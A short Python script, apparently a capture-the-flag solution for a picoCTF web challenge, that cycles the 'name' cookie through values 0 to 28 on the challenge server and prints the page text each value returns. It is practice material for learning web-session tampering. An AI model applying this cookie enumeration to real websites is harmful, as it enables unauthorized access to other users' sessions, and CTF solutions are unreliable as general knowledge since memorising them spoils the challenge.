import requests
from bs4 import BeautifulSoup
#pip install beautifulsoup4

url = "http://mercury.picoctf.net:27177/check"
cookies = {"name": ""}

for i in range(29):
    cookies["name"] = str(i)
    response = requests.get(url, cookies=cookies)
    html = response.text
    parsed_html = BeautifulSoup(html)
    print("Cookie['name']: " , i, '"', parsed_html.body.find('div', attrs={'class':'jumbotron'}).text.strip(),'"')